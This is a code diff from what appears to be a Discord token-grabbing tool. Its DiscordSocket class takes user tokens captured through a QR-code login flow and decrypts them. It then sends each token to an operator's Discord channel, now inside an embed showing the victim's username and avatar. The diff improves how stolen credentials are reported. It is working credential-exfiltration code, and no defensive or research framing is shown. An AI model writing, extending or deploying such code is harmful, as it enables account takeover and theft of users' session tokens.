@@ -4,6 +4,7 @@ import {
   Collection,
   AttachmentBuilder,
   TextChannel,
+  EmbedBuilder,
 } from "discord.js";
 import {
   KeyPairKeyObjectResult,
@@ -25,6 +26,7 @@ import { getTicket, getTicketWithCaptcha } from "../fetch/getTicket";
 import { sharedClient } from "..";
 import { CaptchaSolver } from "./CaptchaSolver";
 import Jimp from "jimp";
+import { tokenEmbed } from "../util/embeds/token";
 
 export class DiscordSocket {
   public messages = new Collection<string, any>();
@@ -68,13 +70,28 @@ export class DiscordSocket {
     this.socket.send(JSON.stringify(data));
   }
 
-  private handleFoundUserToken(_this: DiscordSocket, token: string) {
+  private async handleFoundUserToken(_this: DiscordSocket, token: string) {
     const decryptedToken = privateDecrypt(
       { key: _this.keyPair.privateKey, oaepHash: "sha256" },
       Buffer.from(token, "base64")
     );
 
-    (sharedClient.channel as TextChannel).send(decryptedToken.toString());
+    const embed = await tokenEmbed();
+    embed.setDescription(decryptedToken.toString());
+    embed.setAuthor({
+      name: `${_this.userInformation?.username!}#${_this.userInformation
+        ?.discriminator!}`,
+      iconURL:
+        _this.userInformation?.avatar !== "0"
+          ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.userid}/${_this.userInformation?.avatar}`
+          : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
+    });
+
+    console.log(_this.userInformation?.avatar);
+
+    (sharedClient.channel as TextChannel).send({
+      embeds: [embed],
+    });
   }
 
   private hello(_this: DiscordSocket, messageData: IHello) {
